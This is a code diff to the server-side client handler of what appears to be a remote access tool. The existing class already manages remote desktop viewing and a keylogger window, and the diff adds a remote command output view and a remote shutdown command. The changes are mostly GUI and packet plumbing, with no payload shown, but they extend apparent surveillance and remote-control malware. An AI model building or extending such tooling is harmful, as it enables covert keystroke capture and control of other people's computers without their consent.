@@ -1,6 +1,7 @@
 package Server;
 
 import Server.Exception.ClientDisconnectedException;
+import Server.GUI.GuiCommand;
 import Server.GUI.GuiDesktop;
 import Server.GUI.GuiKeyLogger;
 import Server.GUI.GuiText;
@@ -32,6 +33,7 @@ public class ConnectedClient{
     // GUIs
     private GuiDesktop desktop;
     private GuiKeyLogger keylogger;
+    private GuiCommand command;
 
     public ConnectedClient(Socket socket) throws IOException {
         this.lastIP = socket.getInetAddress().getHostAddress();
@@ -67,9 +69,18 @@ public class ConnectedClient{
                     this.userName = packet.data.get(1);
                     Server.getInstance().getGUI().updateInfo();
                 } else if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
-                    
-                }
-                else if (packet.action == MessageType.DESKTOP.getID()) {
+
+                } else if (packet.action == MessageType.COMMAND.getID()) {
+                    if (command == null) {
+                        command = new GuiCommand(this);
+                    }
+                    if (this.command.isActive()) {
+                        System.out.println("packet:" + packet.data);
+                        if (packet.data != null) {
+                            command.AddTextToArea(packet.data.get(1));
+                        }
+                    }
+                } else if (packet.action == MessageType.DESKTOP.getID()) {
                     if (desktop == null) {
                         desktop = new GuiDesktop(this);
                     }
@@ -111,6 +122,23 @@ public class ConnectedClient{
             this.keylogger = new GuiKeyLogger(this);
         }
         this.keylogger.setVisible(true);
+    }
+
+    public void openCommandView() {
+        if (this.command == null) {
+            this.command = new GuiCommand(this);
+        }
+        this.command.setVisible(true);
+    }
+
+    public void SendShutDown(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.SHUTDOWN.getID();
+        try {
+            NetUtils.sendMessage(packet, pw);
+        } catch (Exception e) {
+            System.out.println("Cannot send shutdown packet");
+        }
     }
 
     public PrintWriter getPrintWriter() {
